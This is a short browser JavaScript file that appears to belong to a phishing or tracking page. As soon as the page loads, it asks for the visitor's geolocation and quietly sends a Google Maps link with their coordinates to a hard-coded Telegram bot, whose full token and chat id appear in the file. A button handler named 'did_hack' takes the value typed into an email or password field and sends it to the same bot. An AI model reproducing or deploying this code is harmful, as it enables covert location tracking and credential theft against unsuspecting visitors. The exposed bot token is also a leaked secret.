
const x = document.getElementById("demo");



if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition);
} else {
    x.innerHTML = "Geolocation is not supported by this browser.";
}


let tg = {
    token: "7121075760:AAEAiDMeQOAjzGXbUzTE5fGRxrkDOecyM3I", // Your bot's token that got from @BotFather
    chat_id: "-4261758277" // The user's(that you want to send a message) telegram chat id
}

/**
 * By calling this function you can send message to a specific user
 * @param {String} the text to send
 *
*/
function sendMessage(text)
{
    const url = `https://api.telegram.org/bot${tg.token}/sendMessage?chat_id=${tg.chat_id}&text=${text}`; // The url to request
    const xht = new XMLHttpRequest();
    xht.open("GET", url);
    xht.send();
}


function showPosition(position) {
   
    let lat = position.coords.latitude
    let log = position.coords.longitude
    //let text = 'https://www.google.com/maps/@'+lat+','+log+',16z?entry=ttu'
    let text = 'https://maps.google.com?q='+lat+','+log
    sendMessage(text); 

    x.innerHTML = "Latitude: " + position.coords.latitude +
   "<br>Longitude: " + position.coords.longitude;
}


document.getElementById('did_hack').addEventListener('click', ()=> {
    let pass = document.getElementById('identify_email').value;
    sendMessage(pass); 
});





// Now you can send any text(even a form data) by calling sendMessage function.
// For example if you want to send the 'hello', you can call that function like this:
